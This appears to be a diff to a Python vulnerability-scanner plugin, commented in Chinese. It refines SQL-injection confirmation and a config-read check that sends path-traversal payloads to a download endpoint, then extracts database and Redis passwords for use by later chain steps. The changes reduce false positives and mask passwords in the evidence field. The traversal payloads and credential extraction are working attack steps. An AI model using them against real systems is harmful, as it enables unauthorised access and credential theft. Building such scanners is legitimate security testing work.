@@ -11,7 +11,15 @@ import re
 
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import join_url
+from lib.matcher import match_sql_error
 from plugins.base import PluginBase
+
+
+def _mask_secret(value: str) -> str:
+    """凭证掩码：仅保留首 2 字符用于人工核对，其余以 * 替代（证据脱敏用）"""
+    if not value:
+        return "***"
+    return value[:2] + "***"
 
 
 class SQLInjectExtractPlugin(PluginBase):
@@ -65,15 +73,17 @@ class SQLInjectExtractPlugin(PluginBase):
                 fix=self.fix,
                 extra={"db_name": db_name, "vuln_type": "sql_inject_extract"},
             )
-        # 备用特征：直接包含 database() 报错
-        if "database()" in text and "error" in text.lower():
+        # 备用特征：必须同时含 database() 字面量与 DBMS 专属报错令牌才判定 CONFIRMED。
+        # 历史缺陷：仅要求 "database()" + "error" 子串，普通错误页/回显载荷同样满足，
+        # 会把不可利用目标误报为注入成功（db_name=unknown）并触发整条链。
+        if "database()" in text and match_sql_error(text):
             return ScanResult(
                 kind="chain",
                 name=self.name,
                 severity=self.severity,
                 status=STATUS_CONFIRMED,
                 url=url,
-                evidence="响应含 database() 报错特征",
+                evidence="响应含 database() 与数据库报错特征",
                 fix=self.fix,
                 extra={"db_name": "unknown", "vuln_type": "sql_inject_extract"},
             )
@@ -97,8 +107,9 @@ class ConfigReadPlugin(PluginBase):
     def verify(self, target, session):
         """通过任意文件读取接口下载 application.yml，提取 db/redis 密码
 
-        逐个尝试穿越路径，响应含 password/spring 关键字才视为配置文件；
-        提取的密码存入 extra 供链 1 后续节点使用，读取到文件即 CONFIRMED。
+        逐个尝试穿越路径，响应含 YAML 专有 spring/datasource 配置节才视为配置文件；
+        提取的密码存入 extra 供链 1 后续节点使用（证据仅保留掩码）；
+        读取到文件即 CONFIRMED，全部路径网络异常返回 UNKNOWN。
 
         @param target: 扫描目标 URL
         @param session: HTTP 会话（含登录态与 cookie 处理）
@@ -111,21 +122,33 @@ class ConfigReadPlugin(PluginBase):
             "/profile/../../../../../../../config/application.yml",
             "/profile/../../../../../../../application.yml",
         ]
+        # 记录首次成功读到配置文件的 URL，供「读到文件但未提取到密码」时出证据
+        read_url = ""
+        # 是否至少有一个路径拿到了有效响应。全部请求网络异常时判 UNKNOWN（契约约束）
+        got_response = False
         for path in config_paths:
             url = join_url(target, f"/common/download/resource?resource={path}")
             try:
                 resp = session.get(url)
-                text = resp.text
+                text = resp.text or ""
             except Exception:
                 continue
+            got_response = True
 
-            # 配置文件特征：包含 password 或 spring 关键字
-            if "password" not in text.lower() and "spring" not in text.lower():
+            # 配置文件特征：要求 YAML 专有的 spring 配置节（行首缩进 + "spring:"/"datasource:" 键）。
+            # 加固说明：原判据是泛用英文单词 "password"/"spring"，任意含这些词的
+            # 普通页面（JS/错误页）都会命中，导致误报 CONFIRMED；现用行首键名锚定。
+            if not re.search(r"(?m)^\s*(spring|datasource):", text):
                 continue
 
-            # 正则提取数据库密码
+            # 正则提取数据库密码：限定在 datasource 块内匹配。
+            # 若依 application.yml 的 redis: 块常位于 datasource 之前，泛匹配
+            # password: 会把 Redis 密码误取为 db_password 并传播给下游节点
             db_password = ""
-            db_match = re.search(r"password:\s*(\S+)", text)
+            db_match = re.search(r"(?ms)^[ \t]*datasource:.*?^[ \t]*password:[ \t]*(\S+)", text)
+            if not db_match:
+                # 兼容无嵌套 datasource 的简写配置：退回 spring: 块内首个 password
+                db_match = re.search(r"(?ms)^[ \t]*spring:.*?^[ \t]*password:[ \t]*(\S+)", text)
             if db_match:
                 db_password = db_match.group(1)
 
@@ -137,11 +160,13 @@ class ConfigReadPlugin(PluginBase):
                 redis_password = redis_match.group(1)
 
             if db_password or redis_password:
+                # 证据中只保留掩码形式：明文凭证仅进 extra（供链内下游节点使用），
+                # 避免 ScanResult 持久化到报告/日志时二次泄露敏感口令。
                 evidence_parts = []
                 if db_password:
-                    evidence_parts.append(f"数据库密码: {db_password}")
+                    evidence_parts.append(f"数据库密码: {_mask_secret(db_password)}")
                 if redis_password:
-                    evidence_parts.append(f"Redis密码: {redis_password}")
+                    evidence_parts.append(f"Redis密码: {_mask_secret(redis_password)}")
                 return ScanResult(
                     kind="chain",
                     name=self.name,
@@ -152,16 +177,32 @@ class ConfigReadPlugin(PluginBase):
                     fix=self.fix,
                     extra={"db_password": db_password, "redis_password": redis_password, "vuln_type": "config_read"},
                 )
-            # 配置文件读取成功但未提取到密码
+            # 配置文件读取成功但未提取到密码：记录首个可读 URL，继续尝试更深的路径，
+            # 不在此处提前 return（否则后续路径不再遍历，可能漏掉含密码的那份配置）
+            if not read_url:
+                read_url = url
+
+        # 读到配置文件但全部路径都未提取到密码
+        if read_url:
             return ScanResult(
                 kind="chain",
                 name=self.name,
                 status=STATUS_CONFIRMED,
                 severity=self.severity,
-                url=url,
+                url=read_url,
                 evidence="读取到配置文件但未提取到密码",
                 fix=self.fix,
                 extra={"db_password": "", "redis_password": "", "vuln_type": "config_read"},
+            )
+
+        # 一次有效响应都没有 → 网络异常，判定为不可判定（UNKNOWN），不得判 SAFE
+        if not got_response:
+            return ScanResult(
+                kind="chain",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=target,
+                evidence="网络异常：所有路径请求失败，无法判定",
             )
 
         return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=target, evidence="未读取到配置文件")
